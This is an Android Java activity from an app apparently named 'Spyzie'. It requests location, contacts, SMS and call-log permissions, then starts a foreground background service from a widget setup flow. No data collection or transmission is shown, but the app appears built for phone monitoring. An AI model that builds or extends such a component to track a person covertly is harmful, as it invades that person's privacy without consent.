package com.tantd.spyzie.ui;

import android.Manifest;
import android.appwidget.AppWidgetManager;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;
import android.view.View;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.tantd.spyzie.R;
import com.tantd.spyzie.SpyzieApplication;
import com.tantd.spyzie.core.BaseActivity;
import com.tantd.spyzie.service.MainService;
import com.tantd.spyzie.util.CommonUtils;
import com.tantd.spyzie.util.Constants;

public class PermissionActivity extends BaseActivity {

    private static final String DEBUG_SUB_TAG = "[" + PermissionActivity.class.getSimpleName() + "] ";

    private static final int PERMISSIONS_REQUEST_CODE = 1;

    private static final String[] PERMISSIONS = new String[]{Manifest.permission.ACCESS_COARSE_LOCATION
            , Manifest.permission.ACCESS_FINE_LOCATION
            , Manifest.permission.READ_CONTACTS
            , Manifest.permission.RECEIVE_SMS
            , Manifest.permission.READ_SMS
            , Manifest.permission.READ_CALL_LOG};

    private View btStart;

    private int appWidgetId;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_permission);
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "onCreate");
        }

        btStart = findViewById(R.id.bt_start);

        setResult(RESULT_CANCELED);
        if (CommonUtils.hasPermissions(this, PERMISSIONS)) {
            if (CommonUtils.isMyServiceRunning(this, MainService.class)) {
                showToast(R.string.service_already_running_mes);
                finish();
            }
        } else {
            btStart.setEnabled(false);
            requestPermissions();
        }
    }

    private void requestPermissions() {
        ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSIONS_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSIONS_REQUEST_CODE && isAllPermissionsGranted(grantResults)) {
            btStart.setEnabled(true);
        } else {
            showToast(R.string.grant_permission_mes);
        }
    }

    private boolean isAllPermissionsGranted(int[] grantResults) {
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "isAllPermissionsGranted, grantResults=" + grantResults);
        }
        if (grantResults.length != PERMISSIONS.length) {
            return false;
        }
        for (int val :
                grantResults) {
            if (val != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    public void onClick(View view) {
        showAppWidget();
    }

    private void showAppWidget() {
        appWidgetId = AppWidgetManager.INVALID_APPWIDGET_ID;
        Bundle extras = getIntent().getExtras();
        if (extras != null) {
            appWidgetId = extras.getInt(AppWidgetManager.EXTRA_APPWIDGET_ID, AppWidgetManager.INVALID_APPWIDGET_ID);
            if (appWidgetId == AppWidgetManager.INVALID_APPWIDGET_ID) {
                finish();
            }
            Intent result = new Intent();
            result.putExtra(AppWidgetManager.EXTRA_APPWIDGET_ID, appWidgetId);
            setResult(RESULT_OK, result);
            startMainService();
            finish();
        }
    }

    private void startMainService() {
        Intent serviceIntent = new Intent(SpyzieApplication.getInstance(), MainService.class);
        ContextCompat.startForegroundService(SpyzieApplication.getInstance(), serviceIntent);
    }
}
